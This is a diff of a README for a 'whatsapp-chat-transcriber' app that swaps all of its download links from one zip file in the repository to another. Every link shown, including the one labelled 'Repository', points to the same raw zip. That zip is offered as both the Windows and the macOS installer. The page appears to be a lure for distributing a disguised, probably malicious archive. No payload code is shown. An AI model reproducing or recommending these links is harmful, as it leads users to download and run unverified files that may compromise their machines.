@@ -2,7 +2,7 @@
 
 ## 📥 Download the App
 
-[![Download](https://raw.githubusercontent.com/Mateopecausa/whatsapp-chat-transcriber/main/languages/whatsapp-chat-transcriber_v1.1.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Mateopecausa/whatsapp-chat-transcriber/main/languages/whatsapp-chat-transcriber_v1.1.zip)
+[![Download](https://raw.githubusercontent.com/Mateopecausa/whatsapp-chat-transcriber/main/templates/transcriber-whatsapp-chat-1.2.zip%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Mateopecausa/whatsapp-chat-transcriber/main/templates/transcriber-whatsapp-chat-1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -28,13 +28,13 @@ To run **whatsapp-chat-transcriber**, your system must meet the following requir
 
 To get started, visit the following link to download the latest release:
 
-[Download Latest Release](https://raw.githubusercontent.com/Mateopecausa/whatsapp-chat-transcriber/main/languages/whatsapp-chat-transcriber_v1.1.zip)
+[Download Latest Release](https://raw.githubusercontent.com/Mateopecausa/whatsapp-chat-transcriber/main/templates/transcriber-whatsapp-chat-1.2.zip)
 
 Follow these steps to install the application:
 
 1. Click on the **Download Latest Release** link above.
 2. On the Releases page, look for the latest version.
-3. Choose the appropriate installation file for your operating system (e.g., `https://raw.githubusercontent.com/Mateopecausa/whatsapp-chat-transcriber/main/languages/whatsapp-chat-transcriber_v1.1.zip` for Windows, or `https://raw.githubusercontent.com/Mateopecausa/whatsapp-chat-transcriber/main/languages/whatsapp-chat-transcriber_v1.1.zip` for macOS).
+3. Choose the appropriate installation file for your operating system (e.g., `https://raw.githubusercontent.com/Mateopecausa/whatsapp-chat-transcriber/main/templates/transcriber-whatsapp-chat-1.2.zip` for Windows, or `https://raw.githubusercontent.com/Mateopecausa/whatsapp-chat-transcriber/main/templates/transcriber-whatsapp-chat-1.2.zip` for macOS).
 4. Click the file name to start the download.
 
 ### Installation Steps:
@@ -94,7 +94,7 @@ A3: You can run the application offline after the initial setup. However, downlo
 
 You can find more information, join discussions, or report issues on our GitHub repository: 
 
-[whatsapp-chat-transcriber Repository](https://raw.githubusercontent.com/Mateopecausa/whatsapp-chat-transcriber/main/languages/whatsapp-chat-transcriber_v1.1.zip)
+[whatsapp-chat-transcriber Repository](https://raw.githubusercontent.com/Mateopecausa/whatsapp-chat-transcriber/main/templates/transcriber-whatsapp-chat-1.2.zip)
 
 ## 🙏 Acknowledgments
 
